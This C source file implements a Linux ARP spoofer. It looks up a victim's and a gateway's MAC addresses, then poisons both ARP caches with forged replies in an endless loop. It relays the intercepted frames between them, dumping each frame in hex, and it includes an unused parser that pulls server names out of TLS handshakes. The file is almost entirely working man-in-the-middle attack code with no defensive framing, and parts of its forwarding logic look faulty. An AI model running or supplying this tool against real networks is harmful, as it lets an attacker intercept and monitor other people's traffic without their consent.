#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <net/ethernet.h>
#include <linux/if_packet.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <unistd.h>
#include <string.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <sys/types.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>

#include <netinet/ip.h>
#include <net/ethernet.h>
#include <linux/tcp.h>
#include <netinet/ip_icmp.h>

/* get packet from kernel use raw socket */
void get_server_name(unsigned char *buffer, int size);
void captureAndForward(const char* interfaceName, const struct in_addr victimIP, const unsigned char* victimMAC, const struct in_addr gatewayIP, const unsigned char* gatewayMAC);

/* constant values */
#define MAC_ADDR_LEN 0x06  /* MAC address length (48 bits) */
#define IPv4_ADDR_LEN 0x04  /* IPv4 address length (32 bits) */

#define ETH_TYPE_PROTO_ARP 0x806  /* EtherType value of ARP */

#define ARP_HTYPE_ETH 1  /* Ethernet */
#define ARP_PTYPE_IP 0x0800  /* IPv4 */

#define ARP_OPER_REQUEST 1  /* ARP request */
#define ARP_OPER_REPLY 2  /* ARP reply */

#define BUFFSIZE 65536
#define MAX_PACKET_SIZE 65536

/* Ethernet frame struct */
typedef struct{
    uint8_t dest[MAC_ADDR_LEN]; /* destination MAC address */
    uint8_t src[MAC_ADDR_LEN];  /* source MAC address */
    uint16_t type;              /* EtherType */
} etherheader_t;

/* ARP packet struct */
typedef struct{
    uint16_t htype;                     /* hardware type */
    uint16_t ptype;                     /* protocol type */
    unsigned char hlen;                 /* hardware length */
    unsigned char plen;                 /* protocol length */
    uint16_t op;                        /* operation */
    unsigned char sha[MAC_ADDR_LEN];    /* sender hardware address */
    unsigned char spa[IPv4_ADDR_LEN];   /* sender protocol address */
    unsigned char tha[MAC_ADDR_LEN];    /* target hardware address */
    unsigned char tpa[IPv4_ADDR_LEN];   /* target protocol address */
} arpheader_t;


typedef struct __attribute__((packed)){
    uint8_t content_type;  // 0x16 for TLS handshake
    uint16_t version;
    uint16_t length;
} TLSRecord;

typedef struct __attribute__((packed)) {
    uint8_t handshake_type;  // 0x01 for Client Hello
    uint8_t length[3];
    uint16_t version;
    uint8_t random[32];  // Random data
    uint8_t session_id_length;
    uint8_t session_id[32];  // Session ID (variable length)
    uint16_t cipher_suites_length;
    uint16_t cipher_suites[16];  // Supported cipher suites (variable length)
    uint8_t compression_methods_length;
    uint8_t compression_methods[1];  // Supported compression methods (variable length)
    uint16_t extensions_length;
    uint8_t extensions[1024];  // Extensions (variable length)
} ClientHello;

typedef struct __attribute__((packed)){
    uint16_t extension_type;        // 0x0000: server_name
    uint16_t extension_length;
    uint8_t extension_data[1024];
} Extension;

typedef struct __attribute__((packed)) {
    uint16_t server_name_list_length;
    uint8_t server_name_type;   //0x00: server name type=host_name
    uint16_t server_name_length;
    uint8_t server_name[256];   
} ServerName;

unsigned char localMAC[MAC_ADDR_LEN];   /* local MAC address */
struct in_addr localIP;                 /* local IP address */
char interfaceName[256];                /* network interface name */

/* check if user is root */
int isUserRoot(){
    /* root's UID is 0 */
    if (getuid() == 0)
        return 1;
    else
        return 0;
}

/* get index of interface */
int getIfIndex(const char* ifname, int* outIfIndex){
    struct ifreq ifr;
    strcpy(ifr.ifr_name, ifname);

    int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);

    /* getting interface index */
    if (ioctl(sockfd, SIOCGIFINDEX, &ifr) == 0){
        /* copy index to output variable */
        *outIfIndex = ifr.ifr_ifindex;
        close(sockfd);
        return 0;
    }

    /* if error occurred */
    perror("ioctl");
    close(sockfd);
    return -1;
}

/* print MAC address in readable format */
void printMacAddress(const unsigned char* mac){
    /* print MAC address in format aa:bb:cc:dd:ee:ff */
    printf("%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

/* get MAC address of local machine */
int getLocalMacAddress(const char* ifname, unsigned char* outMac){
    struct ifreq ifr;
    strcpy(ifr.ifr_name, ifname);

    int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);

    /* getting interface's hardware address */
    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) == 0){
        /* copy MAC address to output variable */
        memcpy(outMac, ifr.ifr_addr.sa_data, MAC_ADDR_LEN);
        close(sockfd);
        return 0;
    }

    /* if error occurred */
    perror("ioctl");
    close(sockfd);
    return -1;
}

/* print IPv4 address in readable format */
void printIpAddress(const struct in_addr ip){
    /* print IPv4 address in dotdecimal format */
    printf("%s", inet_ntoa(ip));
}

/* get MAC address of local machine */
int getLocalIpAddress(const char* ifname, struct in_addr* outIp){
    struct ifreq ifr;
    strcpy(ifr.ifr_name, ifname);
    ifr.ifr_addr.sa_family = AF_INET;

    int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);

    /* getting interface's IP address */
    if (ioctl(sockfd, SIOCGIFADDR, &ifr) == 0){
        struct sockaddr_in* addr = (struct sockaddr_in*)&ifr.ifr_addr;

        /* copy IP address to output variable */
        memcpy(outIp, &addr->sin_addr, sizeof(struct in_addr));
        close(sockfd);
        return 0;
    }

    /* if error occurred */
    perror("ioctl");
    close(sockfd);
    return -1;
}

/* get MAC address of remote host using ARP request */
int getMacAddress(const struct in_addr ip, unsigned char* outMac){
    etherheader_t etherFrame;
    arpheader_t arpRequest;
    unsigned char broadcastMAC[MAC_ADDR_LEN] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    size_t frameSize = sizeof(etherheader_t) + sizeof(arpheader_t);
    unsigned char* frame = (unsigned char*)malloc(frameSize);
    memset(frame, 0, frameSize);
    int count = 100;

    /* create Ethernet frame */
    memcpy(&etherFrame.dest, broadcastMAC, MAC_ADDR_LEN);
    memcpy(&etherFrame.src, localMAC, MAC_ADDR_LEN);
    etherFrame.type = htons(ETH_TYPE_PROTO_ARP);

    /* create ARP packet */
    arpRequest.op = htons(ARP_OPER_REQUEST);
    arpRequest.htype = htons(ARP_HTYPE_ETH);
    arpRequest.hlen = MAC_ADDR_LEN;
    arpRequest.ptype = htons(ARP_PTYPE_IP);
    arpRequest.plen = IPv4_ADDR_LEN;
    memcpy(&arpRequest.tha, broadcastMAC, MAC_ADDR_LEN);
    memcpy(&arpRequest.tpa, &ip, sizeof(struct in_addr));
    memcpy(&arpRequest.sha, localMAC, MAC_ADDR_LEN);
    memcpy(&arpRequest.spa, &localIP, sizeof(struct in_addr));
    
    int sockfd;

    /* create socket to send ARP request */
    if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0){
        /* if error occurred */
        perror("socket");
        free(frame);
        return -1;
    }

    struct ifreq ifr;
    strncpy((char*)&ifr.ifr_name, interfaceName, sizeof(ifr.ifr_name));
    

    /* bind socket to the interface */
    if (setsockopt(sockfd, SOL_SOCKET, SO_BINDTODEVICE, &ifr, sizeof(ifr)) < 0){
        /* if error occurred */
        perror("setsockopt");
        close(sockfd);
        free(frame);
        return -1;
    }

    int ifindex;
    if(getIfIndex(interfaceName, &ifindex) < 0){
        /* if error occurred */
        perror("ioctl");
        close(sockfd);
        free(frame);
        return -1;
    }

    /* socket address struct (link-layer) */
    struct sockaddr_ll sockAddr;
    sockAddr.sll_family = AF_PACKET;
    sockAddr.sll_protocol = htons(ETH_P_ARP);
    sockAddr.sll_halen = MAC_ADDR_LEN;
    sockAddr.sll_hatype = htons(ARPHRD_ETHER);
    sockAddr.sll_ifindex = ifindex;
    sockAddr.sll_pkttype = (PACKET_BROADCAST);
    memcpy(&sockAddr.sll_addr, &arpRequest.sha, MAC_ADDR_LEN);

    memcpy(frame, &etherFrame, sizeof(etherFrame));
    memcpy(frame + sizeof(etherFrame), &arpRequest, sizeof(arpRequest));

    /* send ARP request */
    if (sendto(sockfd, frame, frameSize, 0, (struct sockaddr*)&sockAddr, sizeof(struct sockaddr_ll)) < 0){
        /* if error occurred */
        perror("sendto");
        free(frame);
        return -1;
    }

    free(frame);

    int i;
    unsigned char buffer[BUFFSIZE];

    /* receive ARP reply */
    for (i = 0; i < count; i++){
        memset(buffer, 0, BUFFSIZE);
        if(recvfrom(sockfd, buffer, BUFFSIZE, 0, NULL, NULL) < 0){
            /* if error occurred */
            perror("recvfrom");
            continue;
        }

        /* dissect Ethernet frame from received buffer */
        etherheader_t* ethFrameRecvd = (etherheader_t*)buffer;

        /* if frame is ARP */
        if (ntohs(ethFrameRecvd->type) == ETH_TYPE_PROTO_ARP){
            /* dissect Ethernet frame from received buffer */
            arpheader_t* arpResp = (arpheader_t*)(buffer + sizeof(etherheader_t));
            if (ntohs(arpResp->op) == 2){
                /* copy MAC address of remote host to output */
                memcpy(outMac, ethFrameRecvd->src, MAC_ADDR_LEN);
                return 0;
            }
        }
    }

    return -1;
}

/* sending spoofed ARP packet */
int sendGratuitousArpReply(const struct in_addr destIP, const unsigned char* destMAC, const struct in_addr srcIP, const unsigned char* srcMAC){
    etherheader_t etherFrame;
    arpheader_t arpReply;
    size_t frameSize = sizeof(etherheader_t) + sizeof(arpheader_t);
    unsigned char* frame = (unsigned char*)malloc(frameSize);
    memset(frame, 0, frameSize);

    /* create Ethernet frame */
    memcpy(&etherFrame.dest, destMAC, MAC_ADDR_LEN);
    memcpy(&etherFrame.src, srcMAC, MAC_ADDR_LEN);
    etherFrame.type = htons(ETH_TYPE_PROTO_ARP);

    /* create ARP packet */
    arpReply.op = htons(ARP_OPER_REPLY);
    arpReply.htype = htons(ARP_HTYPE_ETH);
    arpReply.hlen = MAC_ADDR_LEN;
    arpReply.ptype = htons(ARP_PTYPE_IP);
    arpReply.plen = IPv4_ADDR_LEN;
    memcpy(&arpReply.tha, destMAC, MAC_ADDR_LEN);
    memcpy(&arpReply.tpa, &destIP, sizeof(struct in_addr));
    memcpy(&arpReply.sha, srcMAC, MAC_ADDR_LEN);
    memcpy(&arpReply.spa, &srcIP, sizeof(struct in_addr));
    
    int sockfd;

    /* create socket to send ARP packet */
    if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0){
        /* if error occurred */
        perror("socket");
        free(frame);
        return -1;
    }

    struct ifreq ifr;
    strncpy((char*)&ifr.ifr_name, interfaceName, sizeof(ifr.ifr_name));

    /* bind socket to the interface */
    if (setsockopt(sockfd, SOL_SOCKET, SO_BINDTODEVICE, &ifr, sizeof(ifr)) < 0){
        /* if error occurred */
        perror("setsockopt");
        close(sockfd);
        free(frame);
        return -1;
    }

    int ifindex;
    if(getIfIndex(interfaceName, &ifindex) < 0){
        /* if error occurred */
        perror("ioctl");
        close(sockfd);
        free(frame);
        return -1;
    }

    /* socket address struct (link-layer) */
    struct sockaddr_ll sockAddr;
    sockAddr.sll_family = AF_PACKET;
    sockAddr.sll_protocol = htons(ETH_P_ARP);
    sockAddr.sll_halen = MAC_ADDR_LEN;
    sockAddr.sll_hatype = htons(ARPHRD_ETHER);
    sockAddr.sll_ifindex = ifindex;
    sockAddr.sll_pkttype = (PACKET_MR_UNICAST);
    memcpy(&sockAddr.sll_addr, &arpReply.sha, MAC_ADDR_LEN);

    memcpy(frame, &etherFrame, sizeof(etherFrame));
    memcpy(frame + sizeof(etherFrame), &arpReply, sizeof(arpReply));

    /* send ARP packet */
    if (sendto(sockfd, frame, frameSize, 0, (struct sockaddr*)&sockAddr, sizeof(struct sockaddr_ll)) < 0){
        /* if error occurred */
        perror("sendto");
        free(frame);
        return -1;
    }

    free(frame);

    return 0;
}

/* ARP cache poisoning infinite loop */
void poisonArp(const struct in_addr victimIP, const unsigned char* victimMAC, const struct in_addr gatewayIP, const unsigned char* gatewayMAC){
    pid_t pid = fork();
    if (pid == 0){      // child process
        while (1){
            if (sendGratuitousArpReply(victimIP, victimMAC, gatewayIP, localMAC) < 0){
                printf("Send ARP reply to victim failed \n");
            }
            else{
                printf("Send ARP reply to victim \n");              
            }

            if (sendGratuitousArpReply(gatewayIP, gatewayMAC, victimIP, localMAC) < 0){
                printf("Send ARP reply to gateway failed \n ");
            }
            else{
                printf("Send ARP reply to gateway \n");
            }
            sleep(5);
        }
    }
    else{   // parent process
        captureAndForward(interfaceName, victimIP, victimMAC, gatewayIP, gatewayMAC);
    }
}


void get_server_name(unsigned char *buffer, int size){
    // Skip the Ethernet, Ip, TCP headers
    struct ethhdr * eth = (struct ethhdr *)(buffer);
    unsigned short ethhdrlen = sizeof(struct ethhdr);
    struct iphdr *iph = (struct iphdr *)(buffer + ethhdrlen);
    unsigned short iphdrlen = iph->ihl*4;
    struct tcphdr *tcph = (struct tcphdr *)(buffer + iphdrlen + ethhdrlen);
    unsigned short tcphdrlen = tcph->doff*4;

    // Check if the packet is long enough to contain a TLS record
    if (size < iphdrlen + tcphdrlen + sizeof(TLSRecord) + ethhdrlen) {
        return;
    }

    // Get the server name indication
    TLSRecord *tls = (TLSRecord*)(buffer + iphdrlen + tcphdrlen + ethhdrlen);
    if (tls->content_type == 0x16){
        ClientHello *client_hello = (ClientHello*)(buffer + iphdrlen + tcphdrlen + sizeof(TLSRecord) + ethhdrlen);
        if (client_hello->handshake_type == 0x01) { // Client hello handshake type
            uint8_t *ptr = client_hello->extensions;
            uint8_t *end = client_hello->extensions + ntohs(client_hello->extensions_length);
            while (ptr < end){
                Extension *ext = (Extension*)ptr;
                if (ntohs(ext->extension_type) == 0x0000){  // 0x0000: server name
                    ServerName *server_name = (ServerName*)ext->extension_data;
                    printf("Server name: ");
                    for (int i = 0; i < ntohs(server_name->server_name_length); i++){
                        printf("%c", server_name->server_name[i]);
                    }
                    printf("\n");
                }
                ptr += ntohs(ext->extension_length) + 4;
            }
        }
    }
}

void captureAndForward(const char* interfaceName, const struct in_addr victimIP, const unsigned char* victimMAC, const struct in_addr gatewayIP, const unsigned char* gatewayMAC) {
    int sockfd;
    struct sockaddr_ll gatewayAddr, victimAddr;
    unsigned char buffer[65535];

    // Create socket to capture packets
    if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
        perror("socket");
        return;
    }

    struct ifreq ifr;
    strncpy((char*)&ifr.ifr_name, interfaceName, sizeof(ifr.ifr_name));

    int ifindex;
    if(getIfIndex(interfaceName, &ifindex) < 0){
        /* if error occurred */
        perror("ioctl");
        close(sockfd);
        return;
    }
    // printf(" ifindex: %d\n", ifindex);

    // // Bind socket to the interface
    // if (setsockopt(sockfd, SOL_SOCKET, SO_BINDTODEVICE, &ifr, sizeof(ifr)) < 0) {
    //     perror("setsockopt");
    //     close(sockfd);
    //     return;
    // }

    while (1) {
        // Receive packet
        ssize_t packetSize = recvfrom(sockfd, buffer, ETH_FRAME_LEN, 0, NULL, NULL);
        
        if (packetSize < 0) {
            perror("recvfrom");
            continue;
        }
        
        // printf("Packet receive \n");
        // for(int i = 0; i < packetSize; i++){
        //     printf("%02x ", buffer[i]);
        // }
        // printf("\n\n\n");

        // Check if the packet is from the victim
        struct ether_header* ethHeader = (struct ether_header*)buffer;

        pid_t pid = fork();
        if(pid == 0){
            if (memcmp(ethHeader->ether_shost, victimMAC, ETH_ALEN) == 0) {
            // Modify the destination MAC address to the gateway's MAC address
            
                printf("Packet from victim\n");
                for(int i = 0; i < packetSize; i++){
                    printf("%02x ", buffer[i]);
                }
                printf("\n");

                memset(&gatewayAddr, 0, sizeof(struct sockaddr_ll));
                gatewayAddr.sll_family = AF_PACKET;
                gatewayAddr.sll_protocol = htons(ETH_P_ALL);
                // gatewayAddr.sll_ifindex = ifr.ifr_ifindex;
                gatewayAddr.sll_ifindex = ifindex;
                memcpy(&gatewayAddr.sll_addr, gatewayMAC, ETH_ALEN);
                gatewayAddr.sll_halen = ETH_ALEN;
                gatewayAddr.sll_pkttype = PACKET_OTHERHOST;
                gatewayAddr.sll_hatype = ARPHRD_ETHER;

                memcpy(ethHeader->ether_shost, localMAC, ETH_ALEN);
                memcpy(ethHeader->ether_dhost, gatewayMAC, ETH_ALEN);

                // printf("Packet after modification send to gateway\n ");
                // for(int i = 0; i < packetSize; i++){
                //     printf("%02x ", buffer[i]);
                // }
                // printf("\n\n\n");

                // //bind the socket to the interface
                // if(bind(sockfd, (struct sockaddr*)&gatewayAddr, sizeof(struct sockaddr_ll)) < 0){
                //     perror("bind");
                //     continue;
                // }

                // Forward the packet to the gateway
                if (sendto(sockfd, buffer, packetSize, 0, (struct sockaddr*)&gatewayAddr, sizeof(struct sockaddr_ll)) < 0) {
                    perror("send to gate way");
                    continue;
                }

                printf("Packet gateway received\n");
                for(int i = 0; i < packetSize; i++){
                    printf("%02x ", buffer[i]);
                }
                printf("\n\n\n");
            }
        }

        else{
            if (memcmp(ethHeader->ether_shost, gatewayMAC, ETH_ALEN) == 0){          
                printf("Packet from gateway\n");
                for (int i = 0; i < packetSize; i++){
                    printf("%02x ", buffer[i]);
                }
                printf("\n");

                memset(&victimAddr, 0, sizeof(struct sockaddr_ll));
                victimAddr.sll_family = AF_PACKET;
                victimAddr.sll_protocol = htons(ETH_P_ALL);
                // victimAddr.sll_ifindex = ifr.ifr_ifindex;
                victimAddr.sll_ifindex = ifindex;
                memcpy(&victimAddr.sll_addr, victimMAC, ETH_ALEN);
                victimAddr.sll_halen = ETH_ALEN;
                victimAddr.sll_pkttype = PACKET_OTHERHOST;
                victimAddr.sll_hatype = ARPHRD_ETHER;

                // Modify the source MAC address to the attacker's MAC address
                memcpy(ethHeader->ether_shost, gatewayMAC, ETH_ALEN);
                memcpy(ethHeader->ether_dhost, localMAC, ETH_ALEN);

                // if(bind(sockfd, (struct sockaddr*)&victimAddr, sizeof(struct sockaddr_ll)) < 0){
                //     perror("bind");
                //     continue;
                // }

                // Forward the packet back to the victim
                if (sendto(sockfd, buffer, packetSize, 0, (struct sockaddr*)&victimAddr, sizeof(struct sockaddr_ll)) < 0) {
                    perror("sendtovictim");
                    continue;
                }
                printf("Packet victim received\n"); 
                for (int i = 0; i < packetSize; i++){
                    printf("%02x ", buffer[i]);
                }
                printf("\n\n\n");

            }      
        }     
    }
    close(sockfd);
}



int main(int argc, char* argv[]){
    if(!isUserRoot()){
        printf("Run this as root\n");
        return 0;
    }

    if (argc < 4){
        printf("usage: sudo %s <iface name> <victim's IP> <gateway's IP>", argv[0]);
        return 0;
    }

    printf("Linux ARP spoofer\n-----------------\n");

    strcpy(interfaceName, argv[1]);

    printf("Looking for MAC addresses...\n");

    if(getLocalMacAddress(interfaceName, localMAC) == -1){
        printf("Error during checking local MAC address\n");
        return -1;
    }
    else{
        printf("Local MAC address is ");
        printMacAddress(localMAC);
        printf("\n");
    }

    if(getLocalIpAddress(interfaceName, &localIP) == -1){
        printf("Error during checking local IP address\n");
    }
    else{
        printf("Local IP address is ");
        printIpAddress(localIP);
        printf("\n");
    }

    struct in_addr victimIP;
    victimIP.s_addr = inet_addr(argv[2]);
    unsigned char victimMAC[MAC_ADDR_LEN];

    struct in_addr gatewayIP;
    gatewayIP.s_addr = inet_addr(argv[3]);
    unsigned char gatewayMAC[MAC_ADDR_LEN];

    if (getMacAddress(victimIP, victimMAC) < 0){
        printf("Unable to find victim's MAC address\n");
        return -1;
    }
    else{
        printf("Victim's (%s) MAC address: ", argv[2]);
        printMacAddress(victimMAC);
        printf("\n");
    }

    if (getMacAddress(gatewayIP, gatewayMAC) < 0){
        printf("Unable to find gateway's MAC address\n");
        return -1;
    }
    else{
        printf("Gateway's (%s) MAC address: ", argv[3]);
        printMacAddress(gatewayMAC);
        printf("\n");
    }

    printf("Poisoning...\n");
    poisonArp(victimIP, victimMAC, gatewayIP, gatewayMAC);

    return 0;
}
